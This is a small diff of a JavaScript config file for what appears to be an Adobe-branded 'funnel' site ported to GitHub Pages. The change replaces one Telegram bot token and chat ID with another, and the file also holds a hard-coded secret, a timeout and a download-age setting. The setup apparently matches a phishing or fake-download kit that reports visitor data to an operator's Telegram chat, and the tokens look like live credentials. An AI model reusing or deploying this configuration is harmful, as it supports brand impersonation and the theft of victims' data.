@@ -1,7 +1,7 @@
 // Funnel config (static GitHub Pages port of lib.php). Brand: ADOBE.
 window.CFG = {
-  TG_BOT:  "8949994538:AAFD89GkBz9p9zh1o9yqwwk4SND7wKrovpM",
-  TG_CHAT: "7901102007",
+  TG_BOT:  "8700828712:AAGiuRuCPYlvrl3reNT9WxKLSHw23BOvXbg",
+  TG_CHAT: "2115160736",
   SECRET:  "don-lifetime-adobe-funnel-ab9e2c74f1-3c8a",
   TTL: 900,
   MIN_DL_AGE: 6,
